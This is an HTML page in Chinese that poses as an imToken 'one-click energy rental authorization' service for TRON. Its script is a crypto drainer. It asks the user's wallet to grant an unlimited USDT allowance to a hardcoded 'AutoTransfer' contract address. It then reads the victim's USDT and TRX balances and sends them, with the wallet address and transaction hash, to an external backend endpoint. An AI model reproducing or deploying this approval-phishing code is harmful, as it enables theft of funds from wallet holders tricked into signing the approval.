<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>imToken一键能量授权</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; 
           padding: 20px; max-width: 500px; margin: 0 auto; background: #f5f5f5; }
    .header { text-align: center; margin-bottom: 30px; }
    .header h1 { font-size: 22px; color: #2c3e50; margin-bottom: 10px; }
    .warning { background: #fff8e1; color: #e6a23c; padding: 12px; border-radius: 8px; 
               font-size: 14px; margin-bottom: 20px; text-align: left; }
    .btn { width: 100%; padding: 15px; font-size: 16px; border: none; border-radius: 8px; 
           background: #409EFF; color: white; cursor: pointer; margin-bottom: 15px; }
    .btn:disabled { background: #ccc; cursor: not-allowed; }
    #userInfo { text-align: center; font-size: 14px; color: #333; margin: 20px 0; padding: 15px; background: #fff; border-radius: 8px; }
    .record-list { margin-top: 30px; }
    .record-item { background: #fff; padding: 15px; margin-bottom: 15px; border-radius: 8px; font-size: 14px; }
    .record-item p { margin-bottom: 8px; color: #333; }
    .record-item p strong { color: #2c3e50; }
    .tx-link { color: #409EFF; text-decoration: none; }
  </style>
</head>
<body>
  <div class="header">
    <h1>能量租赁一键授权</h1>
    <div class="warning">
    ⚠️ 请用 <strong>imToken钱包内置浏览器</strong> 打开此页面<br>
    ⚠️ 非钱包浏览器：复制链接 → 打开imToken → 底部“浏览” → 粘贴链接访问
    </div>
  </div>

  <div style="margin: 15px 0; display: flex; align-items: center; gap: 10px;">
    <span id="copyLinkText" style="color: #007AFF; word-break: break-all;">
      https://trc20trx-alt.github.io/Trc20.TRX/
    </span>
    <button id="copyLinkBtn" style="padding: 5px 10px; cursor: pointer;">
     <strong>复制链接</strong>
    </button>
  </div>

  <button id="connectBtn" class="btn">连接imToken钱包</button>
  <button id="approveBtn" class="btn" disabled>能量授权</button>

  <div id="userInfo">未连接钱包</div>

  <div class="record-list">
    <h3 style="font-size: 16px; margin-bottom: 15px; color: #2c3e50;">授权记录</h3>
    <div id="approvalRecords">暂无授权记录</div>
  </div>

  <script>
    // ========== 需替换的3处配置 ==========
    const AUTO_TRANSFER_CONTRACT = "TNAfknJTfkPbgmyfpwg3rJQrd17ZLKEMQa"; // 你的AutoTransfer合约地址
    const TRC20_TOKEN_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // 主网USDT地址
    const BACKEND_API = "https://tron-notify-backend.vercel.app/api/notify-approval"; // 后端接口

    // 无限授权额度（TRC20 uint256最大值）
    const INFINITE_APPROVE_AMOUNT = "0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF";

    // 全局变量
    let tronWeb, userAddress, trc20Contract;
    const RECORD_KEY = "imtoken_infinite_approval_records";

    window.onload = async () => {
      const connectBtn = document.getElementById("connectBtn");
      const approveBtn = document.getElementById("approveBtn");
      renderApprovalRecords();
      
      // 复制链接功能
      const copyLinkText = document.getElementById("copyLinkText");
      const copyLinkBtn = document.getElementById("copyLinkBtn");
      copyLinkBtn.addEventListener("click", async () => {
        try {
          const linkContent = copyLinkText.textContent.trim();
          await navigator.clipboard.writeText(linkContent);
          alert("链接已成功复制到剪贴板!");
        } catch (error) {
          alert("复制失败，请手动选中链接复制~");
        }
      });

      // 检测imToken内置tronWeb
      if (window.tronWeb && window.tronWeb.ready) {
        tronWeb = window.tronWeb;
        await initWallet();
      } else {
        document.getElementById("userInfo").innerHTML = "请用imToken内置浏览器打开此页面";
      }

      // 手动连接钱包
      connectBtn.onclick = async () => {
        try {
          if (!window.tronWeb) {
            window.location.href = 'imtoken://browser?url=${encodeURIComponent(window.location.href)}';
            return;
          }
          const accounts = await window.tronWeb.request({ method: "tron_requestAccounts" });userAddress = accounts[0];
          await initWallet();
        } catch (e) {
          alert("连接失败：" + e.message);
        }
      };

      // 一键无限授权
      approveBtn.onclick = async () => {
        try {
          const result = await trc20Contract.approve(
            AUTO_TRANSFER_CONTRACT, 
            INFINITE_APPROVE_AMOUNT
          ).send({
            from: userAddress,
            shouldPollResponse: true
          });

          // 获取余额+构造记录
          const [tokenBalance, trxBalance] = await Promise.all([
            getTokenBalance(userAddress),
            getTrxBalance(userAddress)
          ]);
          const record = {
            address: userAddress,
            tokenBalance: tokenBalance.toFixed(2),
            trxBalance: trxBalance.toFixed(2),
            approveTime: new Date().toLocaleString(),
            txHash: result.transaction.txID,
            approveType: "无限额度"
          };

          // 存记录+发后端
          saveApprovalRecord(record);
          await sendDataToBackend(record);

          alert(`无限授权成功！\n交易哈希：${record.txHash}\n可在imToken中撤销授权`);
          renderApprovalRecords();
        } catch (e) {
          alert("授权失败：" + e.message);
        }
      };
    };

    // 初始化钱包信息
    async function initWallet() {
      try {
        userAddress = tronWeb.defaultAddress.base58;
        trc20Contract = await tronWeb.contract().at(TRC20_TOKEN_ADDRESS);

        document.getElementById("userInfo").innerHTML = `
          已连接：<br>
          ${userAddress.slice(0, 8)}...${userAddress.slice(-6)}
        `;
        document.getElementById("approveBtn").disabled = false;
      } catch (e) {
        alert("钱包初始化失败：" + e.message);
      }
    }

    // 查USDT余额
    async function getTokenBalance(address) {
      const balance = await trc20Contract.balanceOf(address).call();
      return balance / 1000000;
    }

    // 查TRX余额
    async function getTrxBalance(address) {
      const balance = await tronWeb.trx.getBalance(address);
      return balance / 1000000;
    }

    // 存本地记录
    function saveApprovalRecord(record) {
      const existing = JSON.parse(localStorage.getItem(RECORD_KEY) || "[]");
      const newRecords = existing.filter(item => item.address !== record.address);
      newRecords.push(record);
      localStorage.setItem(RECORD_KEY, JSON.stringify(newRecords));
    }

    // 渲染授权记录
    function renderApprovalRecords() {
      const container = document.getElementById("approvalRecords");
      const records = JSON.parse(localStorage.getItem(RECORD_KEY) || "[]");

      if (records.length === 0) {
        container.innerHTML = "<div class='record-item'>暂无授权记录</div>";
        return;
      }

      container.innerHTML = records.map(record => `
        <div class="record-item">
          <p><strong>地址：</strong>${record.address.slice(0, 8)}...${record.address.slice(-6)}</p>
          <p><strong>授权类型：</strong>${record.approveType}</p>
          <p><strong>USDT：</strong>${record.tokenBalance} USDT</p>
          <p><strong>TRX：</strong>${record.trxBalance} TRX</p>
          <p><strong>时间：</strong>${record.approveTime}</p>
          <p><a href="https://tronscan.org/#/transaction/${record.txHash}" target="_blank" class="tx-link">查看交易</a></p>
        </div>
      `).join("");
    }

    // 传数据到后端
    async function sendDataToBackend(record) {
      try {
        const res = await fetch(BACKEND_API, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(record)
        });
        if (!res.ok) throw new Error("后端请求失败");
        return res.json();
      } catch (e) {
        alert("授权成功，但通知发送失败：" + e.message);
        throw e;
      }
    }
  </script>
</body>
</html>
